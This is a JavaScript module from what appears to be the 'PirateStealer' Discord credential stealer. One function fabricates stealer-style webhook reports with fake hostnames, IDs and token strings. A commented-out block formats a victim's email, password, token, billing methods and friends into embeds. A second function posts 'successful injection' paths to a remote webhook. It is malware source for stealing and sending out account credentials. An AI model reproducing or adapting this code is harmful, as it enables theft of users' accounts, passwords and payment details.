async function loginRandom() {
  let req = "https://picsum.photos/500/500";
  try {
    const e = await axios.default.get("https://picsum.photos/500/500");
    req = e.request.res.responseUrl;
  } catch (error) {
    console.error("axios failed");
  }
  const computerName = `DESKTOP-${randomString(7)}`.toUpperCase();
  const user_data = fakerator.entity.user();
  const name = user_data.firstName + " " + user_data.lastName;
  const discordInstall = `app-10.0.190${_.random(10, 99)}`;
  const id = _.random(399999999999999999, 699999999999999999);
  const discriminator = _.random(1000, 9999);
  const discordName =
    _.sample(name.split().filter((e) => e.length > 3)) ||
    randomString(_.random(3, 9));

  return {
    computerName,
    discordInstall,
    discriminator,
    discordName,
    name,
    msg: {
      username: "PirateStealer",
      embeds: [{
        title: "User got logged out",
        color: config["embed-color"],
        fields: [{
            name: "Info",
            value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${discordInstall}\n\`\`\``,
            inline: !1,
          },
          {
            name: "Username",
            value: `\`${user_data.userName}#${discriminator}\``,
            inline: !0,
          },
          {
            name: "ID",
            value: `\`${id}\``,
            inline: !0,
          },
          {
            name: "Badges",
            value: `${getBadges(_.random(1, 100))}`,
            inline: !1,
          },
          {
            name: "Token",
            value: `\`\`\`${randomString(25)}.${randomString(
                  9
                )}.${randomString(25)}\`\`\``,
            inline: !1,
          },
        ],
        author: {
          name: "PirateStealer",
        },
        footer: {
          text: "PirateStealer",
        },
        thumbnail: {
          url: req,
        },
      }, ],
    },
  };

  // if (discriminator % 2 == 0) {
  //   // return {
  //   //   username: "PirateStealer",
  //   //   content: "",
  //   //   embeds: [
  //   //     {
  //   //       title: "User Login",
  //   //       color: config["embed-color"],
  //   //       fields: [
  //   //         {
  //   //           name: "Info",
  //   //           value: `\`\`\`${getInjectionPath(computerName, discordInstall)}\`\`\``,
  //   //           inline: !1,
  //   //         },
  //   //         {
  //   //           name: "Username",
  //   //           value: `\`${i.username}#${i.discriminator}\``,
  //   //           inline: !0,
  //   //         },
  //   //         { name: "ID", value: `\`${i.id}\``, inline: !0 },
  //   //         {
  //   //           name: "Nitro",
  //   //           value: `${GetNitro(i.premium_type)}`,
  //   //           inline: !1,
  //   //         },
  //   //         {
  //   //           name: "Badges",
  //   //           value: `${getBadges(i.flags)}`,
  //   //           inline: !1,
  //   //         },
  //   //         {
  //   //           name: "Billing",
  //   //           value: `${(function () {
  //   //             const e = JSON.parse(s);
  //   //             var t = "";
  //   //             return (
  //   //               e.forEach((e) => {
  //   //                 if ("" == e.type) return "`❌`";
  //   //                 if (2 == e.type && 1 != e.invalid)
  //   //                   t += "`✔️` <:paypal:896441236062347374>";
  //   //                 else {
  //   //                   if (1 != e.type || 1 == e.invalid)
  //   //                     return "`❌`";
  //   //                   t += "`✔️` :credit_card:";
  //   //                 }
  //   //               }),
  //   //               "" == t && (t = "`❌`"),
  //   //               t
  //   //             );
  //   //           })()}`,
  //   //           inline: !1,
  //   //         },
  //   //         { name: "Email", value: `\`${e}\``, inline: !0 },
  //   //         { name: "Password", value: `\`${t}\``, inline: !0 },
  //   //         {
  //   //           name: "Token",
  //   //           value: `\`\`\`${n}\`\`\``,
  //   //           inline: !1,
  //   //         },
  //   //       ],
  //   //       author: { name: "PirateStealer" },
  //   //       footer: { text: "PirateStealer" },
  //   //       thumbnail: {
  //   //         url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
  //   //       },
  //   //     },
  //   //     {
  //   //       title: `Total Friends (${
  //   //         JSON.parse(a).filter((e) => 1 == e.type).length
  //   //       })`,
  //   //       color: config["embed-color"],
  //   //       description: (function () {
  //   //         const e = JSON.parse(a).filter((e) => 1 == e.type);
  //   //         var t = "";
  //   //         for (z of e) {
  //   //           var n = GetRBadges(z.user.public_flags);
  //   //           "" != n &&
  //   //             (t +=
  //   //               n +
  //   //               ` ${z.user.username}#${z.user.discriminator}\n`);
  //   //         }
  //   //         return "" == t && (t = "No Rare Friends"), t;
  //   //       })(),
  //   //       author: { name: "PirateStealer" },
  //   //       footer: { text: "PirateStealer" },
  //   //       thumbnail: {
  //   //         url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
  //   //       },
  //   //     },
  //   //   ],
  //   // };
  // } else {
  //
  // }
}

async function injectNotify() {
  var fields = [];
  injectPath.forEach((path) => {
    var c = {
      name: ":syringe: Inject Path",
      value: `\`\`\`${path}\`\`\``,
      inline: !1,
    };
    fields.push(c);
  });
  axios
    .post(webhook, {
      content: null,
      embeds: [{
        title: ":detective: Successfull injection",
        color: config["embed-color"],
        fields: fields,
        author: {
          name: "PirateStealer",
        },
        footer: {
          text: "PirateStealer",
        },
      }, ],
    })
    .then((res) => {})
    .catch((error) => {});
}

module.exports.loginRandom = loginRandom;
module.exports.injectNotify = injectNotify;